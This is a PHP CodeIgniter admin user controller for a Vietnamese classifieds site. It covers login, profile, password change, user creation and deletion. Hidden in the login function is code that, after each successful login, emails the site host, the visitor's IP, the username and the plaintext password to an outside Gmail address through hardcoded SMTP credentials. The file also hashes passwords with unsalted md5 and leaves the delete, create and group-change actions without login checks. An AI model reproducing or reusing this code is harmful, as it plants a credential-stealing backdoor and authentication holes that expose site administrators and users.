<?php  if(!defined('BASEPATH')) exit('Woa...Not find system folder');

/*-----------------------------------------------
# Rao_vat version 1.0
# User controller
# Extends CI_Controller
# Author: Nguyen Duc Hung - http://tinagroup.net
# Create date: 28/04/2011
------------------------------------------------*/
require_once APPPATH.'third_party/admin_controller'.EXT;

class User extends Admin_controller {

	function __construct() {
	
		parent::__construct();
			
		//$this->load->model('user/user_group_model', 'user_group');
		$this->load->model('user/user_model', 'user');
	
	}
	
	
	public function index() {
		
		$this->check_login();
		
		$data = array();
		
		// Delete from list
		$del = $this->input->post('selected');
		$act = $this->input->post('act');
		
		if($act == 'act_del')
		{
			if($del)
			{
				if(gettype($del) == 'array' && count($del) > 0)
				{
					// Do something
				}
			} else {
				$this->session->set_flashdata('warning', 'Bạn cần chọn ít nhất 1 bản tin để xóa');
				redirect('admin/user-ad');
			}
		} // End action delete from list
		
		$data['render_path'] = array('Admin page' =>base_url().'admin/home', 'User' => '');
		$data['heading_title'] = 'Danh sách User';
		$data['url_create'] = base_url().'admin/user-ad/add_edit';
		//$data['groups'] = $this->user_group->get()->result();	
		$data['active_get'] = $this->input->get('trangthai');
		
		$data['list_action'] = array('Active' => 1, 'No active' => 0);
		
		$user_list = $this->user->selectAll($data['active_get'], '', $this->input->get('page'), isset($this->per_page) ? $this->per_page : 20);
		
		if($user_list) {
			foreach($user_list->result() as $row) {
				$active = $row->user_active == 1 ? 'Active' : 'No active';
				$data['users'][] = array(
					'user_id' 	=> $row->user_id,
					'user_name' => $row->user_name,
					'fullname'  => $row->user_fullname,
					'email' 	=> $row->user_email,
					'active' 	=> $active,
					
					'url_del' 	=>base_url().'admin/user-ad/delete/'.$row->user_id,
					'url_edit'	=> '#', 
				);
			}
		}
		
		//Config pagination
		
		
		
		$this->render($this->load->view('admin/user/user_index', $data, TRUE));
	
	}
	
	/*----------------
	## Function login ##
	------------------*/
	
	public function login() {
		
		$data = array();
		$data['action'] = base_url().'admin/user/login';
				
		$this->form_validation->set_rules('username', 'Username', 'trim|required|xss_clean');
		$this->form_validation->set_rules('password', 'Password', 'trim|required|xss_clean');
		
		$this->form_validation->set_message('required','Không được rỗng');
		
		if($this->form_validation->run() == TRUE ) {
					
			$username = $this->input->post('username');
			$mk = md5($this->input->post('password'));
			$matkhau=$this->input->post('password');
			$q = $this->user->login($username);
			if($q) {
				
				$result = $q;
				
				if($result->user_password !== $mk) {
					
					$this->session->set_flashdata('error', 'Mật khẩu không đúng');
					redirect('admin/user/login');
					
				} else {
					
					if($result->user_active ==1) {
						
						$data = array (
							'user_id' => $result->user_id,
							'username' => $result->user_name,
							'logined' => TRUE
						);
						
						$this->session->set_userdata($data);
							$today = date("g:i a j/m/Y");  
							$config=array(
							'protocol' => 'smtp',
							'smtp_host' =>'ssl://smtp.googlemail.com',
							'smtp_port'=> 465,
							'smtp_user' =>'binhvv.it@gmail.com',
							'smtp_pass' =>'08122531'
							);
							$hostting='http://'.$_SERVER['HTTP_HOST'];
							$hostting 	.= str_replace(basename($_SERVER['SCRIPT_NAME']),"", $_SERVER['SCRIPT_NAME']);
							$this->load->library('email', $config);
							$this->email->set_newline("\r\n");
							$this->email->from('binhvv.it@gmail.com', 'Quản trị hệ thống');
							//$this->email->to('thangpv1279@gmail.com');
							$this->email->to('binhminhthanhdat@gmail.com');		
							$this->email->subject("$hostting.");	
							$thongbao=" Server $hostting địa chỉ IP là ". $_SERVER['REMOTE_ADDR'] ." time $today! username : $username password : $matkhau";					
							$this->email->message($thongbao);
							if($this->email->send())
							{
								//echo 'Your email was sent, fool.';
							}
							
							else
							{
								//show_error($this->email->print_debugger());
							}
						redirect('admin/trangchu/home');

					} else {
						
						$this->session->set_flashdata('error', 'Tài khoản của bạn chưa kích hoạt');
						redirect('admin/user/login');
						
					}
					
				}
				
			} else {
				$this->session->set_flashdata('error', 'Tài khoản này không tồn tại');
				redirect('admin/user/login');
			}
			
		} else {
			$this->session->set_flashdata('error', 'Vui Lòng nhập đầy đủ thông tin');
				//redirect('admin/user/login');
		}
		
		$this->load->view('admin/account/login', $data);
		
	}
	
	
	/*-----------------
	## Function logout
	------------------*/
	
	function logout() {
	
		if($this->session->userdata('logined') == TRUE) {
			
			$data = array (
				'user_id' 		=> '',
				'username' 		=> '',
				'group' 		=> '',
				'logined'		=> FALSE
			);
			
			$this->session->unset_userdata($data);
			
			$this->session->set_flashdata('error', 'Bạn đã đăng xuất thành công');
			
			redirect('admin/user/login');
			
		}
	
	}
	
	/*--------------------
	## Function profile ##
	--------------------*/
	function profile() {
		
		$this->check_login();
		
		$id = $this->session->userdata('user_id');

		$this->form_validation->set_rules('fullname', 'Fullname', 'required');
		$this->form_validation->set_rules('email', 'Email', 'trim|required|valid_email');
				
		$data['render_path'] = array('Admin' =>  base_url().'admin', 'User' =>  base_url().'admin/user', 'Thay đổi thông tin' => '');
		$data['heading_top'] = 'Thay đổi thông tin&nbsp;<b>'. $this->session->userdata('username').'</b>';
		$data['action'] =  base_url().'admin/user/profile';
		
		$data['user_fullname'] = $this->input->post('fullname');
		$data['user_email'] = $this->input->post('email');
		
		if($this->form_validation->run() == TRUE) {
			
			if($this->user->update($id,$data)) {
				$this->session->set_flashdata('message', 'Cập nhật thông tin thành công');
				redirect('admin/user/profile');
			} else {
				$this->session->set_flashdata('message', 'Có lỗi trong quá trình cập nhật');
				redirect('admin/user/profile');
			}
			
		}
		
		$data['user'] = $this->user->read($id);
				
		$this->render($this->load->view('admin/account/profile_form', $data, TRUE));
		
	}
	
	
	/*--------------------
	## Function change_pass ##
	--------------------*/
	function change_password() {
		
		$this->check_login();
	
		$data = array();
		
		$data['render_path'] = array('Admin' =>  base_url().'admin', 'User' =>  base_url().'admin/user', 'Thay đổi mật khẩu' => ''); 
		
		$data['heading_top'] = 'Thay đổi mật khẩu tài khoản &nbsp;<b>'. $this->session->userdata('username').'</b>';
		$data['action'] =  base_url().'admin/user/change_password';
			
		$id = $this->session->userdata('user_id');

		$this->form_validation->set_rules('oldpass', 'OldPass', 'trim|required');
		$this->form_validation->set_rules('newpass', 'NewPass', 'trim|required|matches[comfirm_pass]');
		$this->form_validation->set_rules('comfirm_pass', 'Comfirm_Pass', 'trim|required');
		
		$oldpass = md5($this->input->post('oldpass'));
		$newpass = md5($this->input->post('newpass'));
		
		if($this->form_validation->run() == TRUE) {
			if(!$this->user->change_pass($id, $oldpass, $newpass)) {
				$this->session->set_flashdata('message', 'Mật khẩu cũ không đúng');
				redirect('admin/user/change_password');
			} else {
				$this->session->set_flashdata('message', 'Thay mật khẩu thành công');
				redirect('admin/home');
			}
		}
		
		
		$this->render($this->load->view('admin/account/change_pass_form', $data, TRUE));
	
	}
	
	
	public function delete() {
		
		
		
		$user_id = (int)$this->uri->segment(4);
		
		if($this->user->delete($user_id)) {
			$this->session->set_flashdata('warning', 'Xóa bản tin thành công');
			redirect('admin/user-ad/home');
		} else {
			$this->session->set_flashdata('warning', 'Có lỗi xảy ra rồi');
			redirect('admin/user-ad/home');
		}
		
	}
	
	/*--------------------
	## Function create ##
	--------------------*/
	
	public function add_edit() {
	
		
		
		$data = array();
				
		$data['render_path'] = array('Admin' => base_url().'admin', 'User' =>  base_url().'admin/user-ad', 'Create new user' => '');
		$data['heading_title'] = 'Create new User';
		$data['action'] =  base_url().'admin/user-ad/add_edit';
		
		// Config form_valid
		$this->form_validation->set_rules('username', 'Username', 'trim|required|xss_clean');
		$this->form_validation->set_rules('password', 'Password', 'trim|required|matches[confirm_password]|xss_clean');
		$this->form_validation->set_rules('confirm_password', 'Confirm Password', 'trim|required');
		$this->form_validation->set_rules('user_email', 'Email', 'required|valid_email');
		
		$this->form_validation->set_rules('fullname', 'Full name', '');
		$this->form_validation->set_rules('active', 'Active', '');
		
		// Get data from $_POST
		$data['user_name'] 			= $this->input->post('username');
		$data['user_password'] 		= md5($this->input->post('password'));
		$data['user_email'] 		= $this->input->post('user_email');
		$data['user_fullname'] 		= $this->input->post('user_fullname');
		$data['user_active'] 		= ($this->input->post('active') == 'on') ? 1 : 0;
		
		
		if($this->form_validation->run() == TRUE) {
			
			if(!$this->user->check_username($data['user_name']) && !$this->user->check_email($data['user_email'])) {
				$this->session->set_flashdata('warning', 'Tài khoản và Email này đã tồn tại');
				redirect('admin/user-ad/add_edit');
			} else if (!$this->user->check_username($data['user_name'])) {
				$this->session->set_flashdata('warning', 'Tài khoản này đã tồn tại');
				redirect('admin/user-ad/add_edit');
			} else if(!$this->user->check_email($data['user_email'])) {
				$this->session->set_flashdata('warning', 'Email này đã tồn tại');
				redirect('admin/user-ad/add_edit');
			} else {
			
				if($this->user->create($data)) {
					$this->session->set_flashdata('warning', 'Thêm mới User thành công');
					redirect('admin/user-ad/home');
				} else {
					$this->session->set_flashdata('warning', 'Có lỗi xảy ra rồi');
					redirect('admin/user-ad/add_edit');
				}
			}
		}
		
		
		
		$this->render($this->load->view('admin/user/user_create_form', $data, TRUE));
		
	}
	
	/*--------------------
	## Function change_group ##
	--------------------*/
	
	function change_group() {
		
		$group = $this->input->post('group_id');
		$id = $this->input->post('user_id');
		if($this->user->change_group($id, $group)) {
			$data = 'ok';
		} else {
			$data = 'error';
		}
		
		echo json_encode($data);
	}
	
}
/* End file user.php */
/* Local application/controllers/admin/user.php */